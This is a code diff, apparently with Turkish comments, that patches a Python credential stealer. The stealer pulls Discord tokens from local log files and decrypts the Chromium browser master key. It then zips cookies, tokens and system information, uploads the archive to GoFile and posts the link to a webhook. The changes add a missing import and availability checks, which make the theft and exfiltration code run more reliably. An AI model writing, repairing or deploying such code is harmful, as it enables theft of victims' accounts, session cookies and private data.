@@ -22,6 +22,7 @@ import struct
 import binascii
 import pathlib
 import logging
+import glob  # EKLENDI - eksikti
 from datetime import datetime, timedelta
 from contextlib import contextmanager
 from Crypto.Cipher import AES, ChaCha20_Poly1305
@@ -138,7 +139,7 @@ def get_discord_tokens():
     for p in paths:
         if not os.path.isdir(p):
             continue
-        for f in (glob.glob(os.path.join(p, "*.log")) + glob.glob(os.path.join(p, "*.ldb"))):
+        for f in glob.glob(os.path.join(p, "*.log")) + glob.glob(os.path.join(p, "*.ldb")):
             try:
                 with open(f, 'r', errors='ignore') as file:
                     content = file.read()
@@ -191,7 +192,8 @@ def get_chromium_master_key(local_state_path, browser_key_name):
             local_state = json.load(f)
         if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
             key_blob = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-            return win32crypt.CryptUnprotectData(key_blob, None, None, None, 0)[1]
+            if WIN32CRYPT_OK:
+                return win32crypt.CryptUnprotectData(key_blob, None, None, None, 0)[1]
     except:
         pass
     return None
@@ -427,7 +429,7 @@ def zip_and_send(cookie_files, backup_files, system_info, discord_tokens, token_
             pass
     # GoFile yedek
     gofile_link = upload_to_gofile(zip_path)
-    if gofile_link:
+    if gofile_link and REQUESTS_OK:
         try:
             requests.post(WEBHOOK_URL, json={"content": f"GoFile backup: {gofile_link}"})
         except:
